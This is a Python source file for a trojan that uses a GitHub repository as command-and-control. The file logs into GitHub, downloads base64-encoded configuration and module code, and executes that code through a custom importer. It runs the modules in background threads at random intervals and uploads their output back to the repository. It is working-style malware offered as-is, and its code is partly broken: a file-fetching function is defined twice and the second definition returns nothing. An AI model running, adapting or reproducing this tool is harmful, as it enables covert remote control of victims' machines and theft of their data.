import json
import base64
import sys
import time 
import importlib
import random
import threading
import queue
import os
import gc


from github3 import login

trojan_id="abc"

trojan_configure="%s.json" % trojan_id
data_path="data/%s/" % trojan_id
trojan_modules=[]
configured=False
task_queue=queue.Queue()

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()

    try:
        file_content = repo.file_contents(filepath)
        return file_content.content
    except Exception as e:
        print(f"Error retrieving file: {e}")
        return None
    
def connect_to_github():
    gh=login(username=sys.argv[1],token=sys.argv[2])
    repo=gh.repository(sys.argv[1],sys.argv[3])
    branch=repo.branch("master")
    return gh,repo,branch
def get_file_contents(filepath):
    gh,repo,branch=connect_to_github()
    repo.file_contents(filepath)
    return None
def get_trojan_config():
    global configured
    config_json=get_file_contents(trojan_configure)
    config=json.loads(base64.b64decode(config_json))
    configured=True

    for task in config:
        if task['module'] not in sys.modules:
            exec(f"import {task['module']}")
        
    return config
def store_module_result(data):
    gh,repo,branch=connect_to_github()
    remote_path=f"data/{trojan_id}/{random.randint(1000,10000)}.data"
    repo.create_file(remote_path,"Commit message",base64.b64encode(data).decode())

class GitImporter(object):
    def __init__(self):
        self.current_module_code=""
    def find_module(self,fullname,path=None):
        if configured:
            print("Attempting to retrieve %s" % fullname)
            new_library=get_file_contents("modules/%s"%fullname)

            if new_library is not None:
                self.current_module_code=base64.b64decode(new_library)
                return self
        return None
    def load_module(self,name):
        module=importlib.new_module(name)
        exec (self.current_module_code ) in module.__dict__
        sys.modules[name]=module
        return module
def module_runner(module):
    task_queue.put(1)
    result=sys.modules[module].run()
    task_queue.get()
    store_module_result(result)
if __name__=="__main__":
    if(len(sys.argv) != 4):
        print("Usage: %s <github_username> <github_password> <repository_name>" % sys.argv[0])
        sys.exit(0)
    sys.meta_path= [GitImporter()]
    while True:
        if task_queue.empty():
            config=get_trojan_config()
            for task in config:
                t=threading.Thread(target=module_runner,args=(task['module'],))
                t.start()
                time.sleep(random.randint(1,10))
        time.sleep(random.randint(1000,10000))
            